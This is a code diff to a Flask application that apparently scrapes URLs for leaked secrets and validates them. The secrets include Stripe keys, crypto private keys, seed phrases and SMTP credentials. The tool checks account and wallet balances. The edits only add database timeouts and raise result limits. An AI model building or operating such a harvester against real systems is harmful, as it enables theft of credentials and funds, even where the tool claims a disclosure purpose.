@@ -194,7 +194,7 @@ def import_from_files():
         os.makedirs(RESULTS_DIR)
         return 0, 0
     
-    conn = sqlite3.connect(DB_PATH)
+    conn = sqlite3.connect(DB_PATH, timeout=30)
     cursor = conn.cursor()
     
     imported_valid = 0
@@ -285,7 +285,7 @@ def import_from_files():
 def get_statistics():
     global scan_start_time
     
-    conn = sqlite3.connect(DB_PATH)
+    conn = sqlite3.connect(DB_PATH, timeout=30)
     cursor = conn.cursor()
     
     cursor.execute('SELECT * FROM statistics WHERE id = 1')
@@ -300,7 +300,7 @@ def get_statistics():
     cursor.execute('''
         SELECT type, key_value, source_url, timestamp, metadata
         FROM credentials
-        ORDER BY id DESC LIMIT 50
+        ORDER BY id DESC LIMIT 500
     ''')
     recent_findings = cursor.fetchall()
     
@@ -377,7 +377,7 @@ def api_stats():
 @app.route('/api/clear', methods=['POST'])
 def api_clear():
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         cursor = conn.cursor()
         cursor.execute('DELETE FROM credentials')
         cursor.execute('UPDATE statistics SET total_urls_scanned=0, total_hits_found=0, total_credentials_valid=0, smtp_servers_found=0 WHERE id=1')
@@ -471,7 +471,7 @@ def _count_crack_session_findings(session_id: str) -> int:
     Queries the DB directly by session_id (set on INSERT during live polling)
     so each session gets its own accurate count instead of the global total."""
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         cursor = conn.cursor()
         cursor.execute('SELECT COUNT(*) FROM credentials WHERE session_id = ?', (session_id,))
         row = cursor.fetchone()
@@ -4045,7 +4045,7 @@ def _poll_live_results(session_id: str) -> None:
                         except Exception:
                             remote_files = []
                         if remote_files:
-                            conn = sqlite3.connect(DB_PATH)
+                            conn = sqlite3.connect(DB_PATH, timeout=30)
                             cursor = conn.cursor()
                             for fname in remote_files:
                                 mapping = FILE_MAPPING.get(fname)
@@ -5650,7 +5650,7 @@ def handle_request_update():
 @socketio.on('clear_results')
 def handle_clear_results():
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         cursor = conn.cursor()
         cursor.execute('DELETE FROM credentials')
         cursor.execute('UPDATE statistics SET total_urls_scanned=0, total_hits_found=0, total_credentials_valid=0, smtp_servers_found=0 WHERE id=1')
@@ -6554,12 +6554,12 @@ def api_findings_stripe():
     """List Stripe keys the scanner has validated. Read-only — admin
     actions (refresh, delete, mark-reported) hit dedicated endpoints."""
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('''SELECT id, type, key_value, source_url, status, metadata,
                             timestamp, reported, last_verified, verify_meta
                      FROM credentials WHERE type = 'Stripe' AND status = 'valid'
-                     ORDER BY id DESC LIMIT 500''')
+                     ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
         return jsonify({'ok': True, 'findings': rows})
@@ -6572,13 +6572,13 @@ def api_findings_crypto():
     """List crypto findings — both Crypto (validated private keys/wallets)
     and Mnemonic (BIP39 seed phrases) types."""
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('''SELECT id, type, key_value, source_url, status, metadata,
                             timestamp, reported, last_verified, verify_meta
                      FROM credentials
                      WHERE type IN ('Crypto', 'Mnemonic') AND status = 'valid'
-                     ORDER BY id DESC LIMIT 500''')
+                     ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
         return jsonify({'ok': True, 'findings': rows})
@@ -6591,7 +6591,7 @@ def api_findings_delete(finding_id: int):
     """Operator-initiated delete of a discovered key. Used for cleanup
     after disclosure or false positives."""
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('DELETE FROM credentials WHERE id = ?', (finding_id,))
         deleted = c.rowcount
@@ -6609,7 +6609,7 @@ def api_findings_mark_reported(finding_id: int):
     try:
         data = request.json or {}
         reported = 1 if data.get('reported', True) else 0
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('UPDATE credentials SET reported = ? WHERE id = ?',
                   (reported, finding_id))
@@ -6626,7 +6626,7 @@ def api_findings_stripe_refresh(finding_id: int):
     """Re-test a previously validated Stripe key against /v1/balance.
     Returns liveness + available balance per currency (read-only)."""
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('SELECT key_value FROM credentials WHERE id = ?', (finding_id,))
         row = c.fetchone()
@@ -6685,7 +6685,7 @@ def api_findings_crypto_refresh(finding_id: int):
         chain = ((request.args.get('chain') or (request.json or {}).get('chain') or 'eth')
                  .strip().lower())
 
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('SELECT key_value, metadata, verify_meta FROM credentials WHERE id = ?',
                   (finding_id,))
